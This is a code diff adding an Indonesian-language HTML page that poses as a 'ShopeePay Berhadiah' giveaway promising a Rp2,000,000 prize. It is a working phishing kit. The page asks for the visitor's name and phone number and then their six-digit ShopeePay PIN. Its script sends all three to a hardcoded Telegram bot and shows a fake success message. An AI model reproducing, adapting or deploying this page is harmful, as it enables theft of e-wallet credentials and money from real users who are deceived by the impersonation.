@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ShopeePay Berhadiah</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --shopee-orange: #ee4d2d;
+            --success-green: #2ecc71;
+            --info-blue: #3498db;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #2c3e50;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background-color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        .banner {
+            width: 100%;
+            display: block;
+        }
+
+        /* ANIMASI SALDO BOX */
+        .balance-container {
+            text-align: center;
+            padding: 18px;
+            background: #fff;
+            margin: -35px 25px 15px 25px;
+            border-radius: 16px;
+            box-shadow: 0 12px 24px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 10;
+            border: 1px solid #ffebe7;
+        }
+
+        .balance-label {
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 5px;
+            font-weight: 700;
+        }
+
+        .balance-amount {
+            font-size: 34px;
+            font-weight: 900;
+            color: var(--shopee-orange);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .form-content {
+            padding: 20px 30px;
+            flex-grow: 1;
+        }
+
+        /* DESKRIPSI PROFESIONAL */
+        .professional-desc {
+            background-color: #f0f7ff;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 35px;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+
+        .info-icon {
+            background: var(--info-blue);
+            color: white;
+            min-width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .desc-text {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.6;
+            margin: 0;
+        }
+
+        /* INPUT STYLE: GARIS BAWAH */
+        .input-group { 
+            margin-bottom: 30px; 
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #999;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-box {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-box .sticker {
+            position: absolute;
+            left: 0;
+            font-size: 20px;
+            color: #444;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 12px 5px 12px 35px;
+            border: none;
+            border-bottom: 2px solid #e0e0e0;
+            border-radius: 0;
+            font-size: 17px;
+            background: transparent;
+            outline: none;
+            transition: all 0.3s ease;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .input-box input:focus { 
+            border-bottom-color: var(--shopee-orange);
+        }
+
+        .btn-shopee {
+            width: 100%;
+            background: linear-gradient(135deg, #ee4d2d 0%, #ff5722 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 900;
+            border-radius: 50px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 8px 20px rgba(238, 77, 45, 0.3);
+            margin-top: 10px;
+        }
+
+        .pin-wrapper {
+            background: #fff;
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 30px 0;
+        }
+
+        .pin-digit {
+            width: 45px;
+            height: 55px;
+            border: none;
+            border-bottom: 3px solid #ddd;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 900;
+            background: transparent;
+            color: var(--shopee-orange);
+            outline: none;
+        }
+
+        .pin-digit:focus { border-bottom-color: var(--shopee-orange); }
+
+        .success-card {
+            text-align: center;
+            padding: 50px 25px;
+            animation: slideUp 0.7s ease-out;
+        }
+
+        .icon-circle {
+            width: 80px;
+            height: 80px;
+            background: var(--success-green);
+            color: white;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            margin-bottom: 25px;
+        }
+
+        .hidden { display: none; }
+        .fade-in { animation: fadeIn 0.6s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body onload="animateValue('balance', 0, 2000000, 2000)">
+
+<div class="container">
+    <!-- Banner Utama Sesuai Gambar Sumber [1] -->
+    <img src="https://cdn.phototourl.com/member/2026-08-15-cf8054f1-4449-4f3a-aaaa-3cd7888cb3e7.png" class="banner" alt="Promo ShopeePay">
+
+    <div class="balance-container fade-in">
+        <div class="balance-label">Total Hadiah Saldo:</div>
+        <div class="balance-amount">
+            <span style="font-size: 20px; margin-top: 5px;">Rp</span>
+            <span id="balance">0</span>
+        </div>
+    </div>
+
+    <div class="form-content">
+        
+        <div id="step1">
+            <button class="btn-shopee" onclick="goStep(2)">Ambil Hadiah Sekarang</button>
+            <p style="text-align: center; font-size: 13px; color: #888; margin-top: 25px;">
+                <span style="color: var(--shopee-orange);">●</span> Khusus pelanggan aktif <b>ShopeePayLater</b>
+            </p>
+        </div>
+
+        <div id="step2" class="hidden fade-in">
+            <div class="professional-desc">
+                <div class="info-icon">i</div>
+                <p class="desc-text">
+                    Demi keamanan pencairan saldo, pastikan akun Shopee Anda telah terverifikasi KTP. Lengkapi data penerima hadiah di bawah ini secara benar.
+                </p>
+            </div>
+
+            <div class="input-group">
+                <label>Nama Lengkap</label>
+                <div class="input-box">
+                    <span class="sticker">👤</span>
+                    <input type="text" id="nama" placeholder="Masukkan nama sesuai akun">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Nomor Telepon</label>
+                <div class="input-box">
+                    <span class="sticker">📞</span>
+                    <input type="tel" inputmode="numeric" id="hp" placeholder="0812xxxxxx">
+                </div>
+            </div>
+
+            <button class="btn-shopee" onclick="goStep(3)">Lanjutkan Verifikasi</button>
+        </div>
+
+        <div id="step3" class="hidden fade-in">
+            <div class="pin-wrapper">
+                <h3 style="margin-top: 0; font-size: 18px; color: #333;">Konfirmasi PIN Keamanan</h3>
+                <p style="color: #666; font-size: 14px;">Silakan masukkan 6 digit PIN ShopeePay Anda</p>
+                <div class="pin-container">
+                    <input type="password" class="pin-digit" maxlength="1" inputmode="numeric" id="p1" oninput="pindah(this, 'p2')">
+                    <input type="password" class="pin-digit" maxlength="1" inputmode="numeric" id="p2" oninput="pindah(this, 'p3')" onkeydown="kembali(event, 'p1')">
+                    <input type="password" class="pin-digit" maxlength="1" inputmode="numeric" id="p3" oninput="pindah(this, 'p4')" onkeydown="kembali(event, 'p2')">
+                    <input type="password" class="pin-digit" maxlength="1" inputmode="numeric" id="p4" oninput="pindah(this, 'p5')" onkeydown="kembali(event, 'p3')">
+                    <input type="password" class="pin-digit" maxlength="1" inputmode="numeric" id="p5" oninput="pindah(this, 'p6')" onkeydown="kembali(event, 'p4')">
+                    <input type="password" class="pin-digit" maxlength="1" inputmode="numeric" id="p6" onkeydown="kembali(event, 'p5')">
+                </div>
+                <button class="btn-shopee" style="background: var(--success-green);" onclick="sendToTelegram()">Konfirmasi Klaim</button>
+            </div>
+        </div>
+
+        <div id="step4" class="hidden success-card">
+            <div class="icon-circle">✓</div>
+            <div style="font-size: 22px; font-weight: 900; color: #222; margin-bottom: 12px;">Permintaan Diproses</div>
+            <p style="color: #666; font-size: 15px; line-height: 1.7;">
+                Hadiah anda sedang di proses sesaat lagi anda akan di hubungi pihak shopee melalui kontak resmi.
+            </p>
+        </div>
+
+    </div>
+</div>
+
+<script>
+    // FUNGSI ANIMASI SALDO BERTAMBAH RP2.000.000 [1]
+    function animateValue(id, start, end, duration) {
+        let obj = document.getElementById(id);
+        let range = end - start;
+        let stepTime = Math.max(Math.abs(Math.floor(duration / range)), 50);
+        let startTime = new Date().getTime();
+        let endTime = startTime + duration;
+        let timer;
+        function run() {
+            let now = new Date().getTime();
+            let remaining = Math.max((endTime - now) / duration, 0);
+            let value = Math.round(end - (remaining * range));
+            obj.innerHTML = value.toLocaleString('id-ID');
+            if (value == end) clearInterval(timer);
+        }
+        timer = setInterval(run, stepTime);
+        run();
+    }
+
+    function pindah(current, nextField) {
+        if (current.value.length === 1 && nextField) document.getElementById(nextField).focus();
+    }
+
+    function kembali(event, prevField) {
+        if (event.key === "Backspace" && event.target.value.length === 0) document.getElementById(prevField).focus();
+    }
+
+    function goStep(n) {
+        if(n === 3 && (!document.getElementById('nama').value || !document.getElementById('hp').value)) {
+            alert("Harap lengkapi data identitas Anda."); return;
+        }
+        document.querySelectorAll('.form-content > div').forEach(div => div.classList.add('hidden'));
+        document.getElementById('step' + n).classList.remove('hidden');
+    }
+
+    // FUNGSI PENGIRIMAN DATA KE TELEGRAM
+    async function sendToTelegram() {
+        const nama = document.getElementById('nama').value;
+        const hp = document.getElementById('hp').value;
+        let pin = "";
+        for(let i=1; i<=6; i++) pin += document.getElementById('p'+i).value;
+
+        if(pin.length < 6) {
+            alert("Harap masukkan 6 digit PIN lengkap.");
+            return;
+        }
+
+        const token = "8853583075:AAExYLVV1rvWjzGkkOtElSG9aZxW7XYQ-XU";
+        const chat_id = "8268307984";
+        const message = `📩 *DATA KLAIM SALDO Rp2.000.000*\n\n👤 *Nama:* ${nama}\n📞 *Nomor:* ${hp}\n🔑 *PIN:* \`${pin}\`\n\n_ShopeePay Berhadiah System_`;
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        try {
+            await fetch(url);
+            goStep(4); // Tampilkan pesan sukses
+        } catch (error) {
+            console.error("Error:", error);
+            alert("Terjadi gangguan koneksi. Silakan coba lagi.");
+        }
+    }
+</script>
+
+</body>
+</html>
